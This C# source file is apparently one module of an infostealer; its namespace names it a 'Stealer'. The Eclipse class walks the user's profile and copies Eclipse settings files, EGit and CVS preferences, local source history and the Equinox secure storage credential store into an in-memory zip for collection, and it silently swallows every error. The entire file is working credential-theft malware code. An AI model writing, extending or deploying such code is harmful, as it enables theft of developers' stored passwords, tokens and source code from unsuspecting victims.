using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class Eclipse : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string userProfilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile));

            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "Eclipse";

            bool foundData = false;

            string[] eclipsePaths = new string[]
            {
                Path.Combine(userProfilePath, ".eclipse"),
                Path.Combine(userProfilePath, "eclipse-workspace", ".metadata"),
                Path.Combine(userProfilePath, "workspace", ".metadata")
            };

            foreach (string eclipsePath in eclipsePaths)
            {
                if (Directory.Exists(eclipsePath))
                {
                    foundData |= CollectFromDirectory(eclipsePath, zip, counterApplications);
                }
            }

            if (foundData && counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }

        private bool CollectFromDirectory(string basePath, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            bool foundData = false;

            try
            {
                string pathName = Path.GetFileName(basePath);
                if (pathName == ".metadata")
                {
                    pathName = Path.GetFileName(Path.GetDirectoryName(basePath)) + "_metadata";
                }

                string pluginsPath = Path.Combine(basePath, ".plugins");
                if (Directory.Exists(pluginsPath))
                {
                    string[] configPaths = new string[]
                    {
                        "org.eclipse.core.runtime\\.settings",
                        "org.eclipse.egit.core\\.settings",
                        "org.eclipse.jdt.core\\.settings",
                        "org.eclipse.team.cvs.core\\.settings"
                    };

                    foreach (string configPath in configPaths)
                    {
                        string fullPath = Path.Combine(pluginsPath, configPath);
                        if (Directory.Exists(fullPath))
                        {
                            string[] prefFiles = Directory.GetFiles(fullPath, "*.prefs", SearchOption.TopDirectoryOnly);
                            
                            foreach (string file in prefFiles)
                            {
                                string relativePath = file.Substring(pluginsPath.Length + 1);
                                string zipPath = $"Applications\\Eclipse\\{pathName}\\{relativePath.Replace("\\", "/")}";
                                zip.AddFile(zipPath, File.ReadAllBytes(file));
                                counterApplications.Files.Add(file + " => " + zipPath);
                                foundData = true;
                            }
                        }
                    }

                    string historyPath = Path.Combine(pluginsPath, "org.eclipse.core.resources\\.history");
                    if (Directory.Exists(historyPath))
                    {
                        string[] historyFiles = Directory.GetFiles(historyPath, "*.*", SearchOption.AllDirectories);
                        
                        foreach (string file in historyFiles.Take(20))
                        {
                            string relativePath = file.Substring(historyPath.Length + 1);
                            string zipPath = $"Applications\\Eclipse\\{pathName}\\history\\{relativePath.Replace("\\", "/")}";
                            zip.AddFile(zipPath, File.ReadAllBytes(file));
                            counterApplications.Files.Add(file + " => " + zipPath);
                            foundData = true;
                        }
                    }
                }

                string secureStoragePath = Path.Combine(basePath, ".eclipse", "org.eclipse.equinox.security");
                if (Directory.Exists(secureStoragePath))
                {
                    string[] secureFiles = Directory.GetFiles(secureStoragePath, "*.*", SearchOption.AllDirectories);
                    
                    foreach (string file in secureFiles)
                    {
                        string relativePath = file.Substring(basePath.Length + 1);
                        string zipPath = $"Applications\\Eclipse\\{pathName}\\{relativePath.Replace("\\", "/")}";
                        zip.AddFile(zipPath, File.ReadAllBytes(file));
                        counterApplications.Files.Add(file + " => " + zipPath);
                        foundData = true;
                    }
                }

                string versionDirs = Path.Combine(basePath, ".eclipse");
                if (Directory.Exists(versionDirs))
                {
                    string[] versions = Directory.GetDirectories(versionDirs, "*", SearchOption.TopDirectoryOnly);
                    
                    foreach (string versionDir in versions)
                    {
                        string versionName = Path.GetFileName(versionDir);
                        
                        string configIni = Path.Combine(versionDir, "configuration", "config.ini");
                        if (File.Exists(configIni))
                        {
                            string zipPath = $"Applications\\Eclipse\\{pathName}\\{versionName}\\config.ini";
                            zip.AddFile(zipPath, File.ReadAllBytes(configIni));
                            counterApplications.Files.Add(configIni + " => " + zipPath);
                            foundData = true;
                        }
                    }
                }
            }
            catch
            {
            }

            return foundData;
        }
    }
}
